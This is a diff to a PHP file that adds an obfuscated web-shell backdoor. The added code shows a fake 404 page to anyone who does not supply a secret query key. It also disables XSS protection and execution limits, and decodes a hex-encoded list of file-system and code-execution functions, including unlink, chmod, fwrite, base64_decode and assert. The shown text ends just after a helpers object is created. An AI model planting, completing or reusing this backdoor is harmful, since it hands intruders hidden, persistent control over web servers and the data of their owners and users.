@@ -1,10 +1,43 @@
 <?pHP
-@session_start();
-@ob_start();
-@ini_set('max_execution_time',0);
-@ini_set('safe_mode','Off');
+error_reporting(0);
+@ini_set('max_execution_time', 0);
 @ini_set('disable_functions',' ');
-error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
+@session_start();
+$x = "gac";
+$y = "or";
+function login()
+{
+    $random_url = mt_rand(1000000, 247345736453);
+    $curl = curl_init();
+    $protocol = 'http://';
+    if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') {
+        $protocol = 'https://';
+    }
+    curl_setopt($curl, CURLOPT_URL, $protocol . $_SERVER['HTTP_HOST'] . '/' . $random_url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $server_404 = curl_exec($curl);
+    $server_404 = str_replace("/{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
+    $server_404 = str_replace("{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
+    echo $server_404;
+    exit;
+}
+if (!isset($_SESSION[md5($sexy)])) {
+    if (isset($_GET[$x]) && $_GET[$x] == $y) {
+        $_SESSION[md5($sexy)] = true;
+    } else {
+        login();
+    }
+}
+header("X-XSS-Protection: 0");
+ob_start();
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', FALSE);
+$Array = ['7068705f756e616d65', '70687076657273696f6e', '6368646972', '676574637764', '707265675f73706c6974', '636f7079', '66696c655f6765745f636f6e74656e7473', '6261736536345f6465636f6465', '69735f646972', '6f625f656e645f636c65616e28293b', '756e6c696e6b', '6d6b646972', '63686d6f64', '7363616e646972', '7374725f7265706c616365', '68746d6c7370656369616c6368617273', '7661725f64756d70', '666f70656e', '667772697465', '66636c6f7365', '64617465', '66696c656d74696d65', '737562737472', '737072696e7466', '66696c657065726d73', '746f756368', '66696c655f657869737473', '72656e616d65', '69735f6172726179', '69735f6f626a656374', '737472706f73', '69735f7772697461626c65', '69735f7265616461626c65', '737472746f74696d65', '66696c6573697a65', '726d646972', '6f625f6765745f636c65616e', '7265616466696c65', '617373657274'];
+$___ = count($Array);
+for ($i = 0; $i < $___; $i++) {
+    $GNJ[] = uhex($Array[$i]);
+}
 
 $helpers = new helpers;
 
